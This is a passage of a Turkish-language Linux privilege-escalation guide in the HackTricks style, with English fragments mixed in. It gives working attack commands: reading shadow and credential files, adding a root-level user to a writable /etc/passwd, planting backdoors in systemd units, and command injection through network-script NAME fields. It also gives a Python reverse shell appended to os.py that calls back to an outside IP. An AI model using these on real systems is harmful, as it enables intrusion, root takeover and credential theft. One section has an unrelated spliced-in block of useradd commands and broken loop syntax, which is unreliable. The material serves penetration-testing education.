SSH agent forwarding, sunucunuzda anahtarları (without passphrases!) bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanızı sağlar. Böylece ssh ile bir **to a host**'a **jump** yapabilir ve oradan **jump to another** host'a, **using** başlangıçta bulunan **key** yani sizin **initial host**'unuzdaki **key** ile erişebilirsiniz.

Bu seçeneği $HOME/.ssh.config içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: Eğer `Host` `*` ise, kullanıcı her farklı bir makineye geçtiğinde, o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar **bir kullanıcı yeni bir shell çalıştırdığında yürütülen betiklerdir**. Bu nedenle, eğer bunlardan herhangi birini **yazabilir veya değiştirebilirseniz ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir garip profil betiği bulunursa, **hassas bilgiler** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle adlandırılmış olabilir veya bir yedeği olabilir. Bu yüzden **tümünü bulun** ve dosyaların içinde **hashes** olup olmadığını görmek için **okuyup okuyamadığınızı kontrol edin**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasının içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Öncelikle, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Generated password: y7$Kp9R!x2LmQ8sB

Commands to run:

sudo useradd -m -s /bin/bash hacker
echo 'hacker:y7$Kp9R!x2LmQ8sB' | sudo chpasswd
sudo chage -d 0 hacker        # force password change on first login (optional)
sudo usermod -aG sudo hacker  # add to sudo group (optional)
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: Bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **service configuration file**'lara yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **modify the Tomcat service configuration file inside /etc/systemd/,** yapabiliyorsanız, şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatılışında çalıştırılacaktır.

### Check Folders

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, **parola içerebilecek birkaç olası dosyayı** arar.\
**Bu amaçla kullanabileceğiniz bir başka ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bir bilgisayarda saklanan çok sayıda parolayı geri almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Eğer logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size audit loglara **parolaları kaydetme** imkanı verebilir, bu gönderide açıklandığı gibi: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Günlükleri okumak için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya **adı** veya **içeriği** içinde "**password**" kelimesi geçen dosyaları kontrol etmeli, ayrıca loglar içindeki IPs ve emails ile hash regexps'leri de incelemelisiniz.\
Bunların hepsinin nasıl yapılacağını burada listelemeyeceğim; ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)'in gerçekleştirdiği son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **içine yazabiliyorsanız** ya da **modify python libraries** yapabiliyorsanız, OS library'yi değiştirip backdoor koyabilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py library'sini kopyalayıp yapıştırın).

Kütüphaneyi **backdoor the library** yapmak için os.py library'sinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştir):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'deki bir zafiyet, bir log dosyası veya üst dizinlerinde **yazma izinleri** olan kullanıcıların potansiyel olarak **yükseltilmiş ayrıcalıklar** elde etmesine olanak tanıyabilir. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştırılacak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ içinde değil, log döndürmenin uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti exploit etmek için [**logrotten**](https://github.com/whotwagner/logrotten) kullanabilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir; dolayısıyla logları değiştirebildiğinizi her gördüğünüzde, bu logları kimin yönettiğini kontrol edin ve logları symlinks ile ikame ederek ayrıcalıkları yükseltip yükseltemeyeceğinizi inceleyin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ içine bir `ifcf-<whatever>` scripti **yazabilirse** veya mevcut bir scripti **düzenleyebiliyorsa**, o zaman **system is pwned**.

Network scriptleri, örneğin _ifcg-eth0_, network bağlantıları için kullanılır. Tamamen .INI dosyaları gibi görünürler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerindeki `NAME=` özniteliği düzgün işlenmiyor. Eğer isimde **boşluk (white/blank space)** varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ve /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **betiklerin** bulunduğu yerdir; klasik Linux servis yönetim sistemidir. Bu dizin `start`, `stop`, `restart` ve bazen `reload` servislerini çalıştırmak için betikler içerir. Bu betikler doğrudan veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` Ubuntu tarafından getirilen daha yeni bir **service management** olan **Upstart** ile ilişkilidir ve servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit betikleri hala Upstart yapılandırmalarıyla birlikte kullanılır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir init ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenler, bu da sistem yönetimini kolaylaştırır.

## Diğer Taktikler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden Kaçış


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting framework'ları genellikle userspace bir manager'a ayrıcalıklı kernel işlevselliğini açmak için bir syscall'e hook yerleştirir. Zayıf manager doğrulaması (ör. FD-order'a dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-root'lu cihazlarda root'a yükselmesine izin verebilir. Daha fazlasını ve istismar detaylarını burada öğrenin:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex-tabanlı service discovery, process komut satırlarından bir binary yolunu çıkarıp yetkili bir bağlamda -v ile çalıştırabilir. İzin verici pattern'ler (ör. \S kullanımı) yazılabilir konumlardaki (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bunun sonucu olarak root olarak çalıştırma (CWE-426 Untrusted Search Path) gerçekleşebilir.

Daha fazlasını ve diğer discovery/monitoring yığınlarına uygulanabilecek genelleştirilmiş deseni burada inceleyin:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Koruması

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve macOS için kernel zaafiyetlerini enumerate eden araç [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
